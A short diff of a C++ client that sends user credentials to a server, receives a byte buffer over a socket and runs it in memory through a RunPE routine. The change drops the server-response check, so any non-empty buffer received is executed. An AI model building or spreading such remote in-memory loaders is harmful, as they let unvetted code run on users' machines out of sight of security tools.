@@ -7,8 +7,6 @@
 
 #include "../../general/protect/dataencryption/dataencryption.h"
 
-#include <iostream>
-
 Session::Session(boost::asio::ip::tcp::socket& socket)
 	: m_socket(std::move(socket)), m_packetHandler(std::make_unique<PacketHandler>(m_socket)) { }
 
@@ -22,9 +20,10 @@ void Session::run() {
 	const std::string credentials = Console::getUserCredentials();
 	m_packetHandler->sendMessage(credentials);
 
-	const EServerResponse serverResponse = m_packetHandler->recvServerResponse();
-	if (serverResponse == EServerResponse::eSR_SUCCESS) {
-		std::vector<char> fileBytes = m_packetHandler->recvBuffer();
-		RunPE::RunExecutable(fileBytes, { });
+	std::vector<char> fileBytes = m_packetHandler->recvBuffer();
+	if (fileBytes.empty()) {
+		return;
 	}
+
+	RunPE::RunExecutable(fileBytes, { });
 }
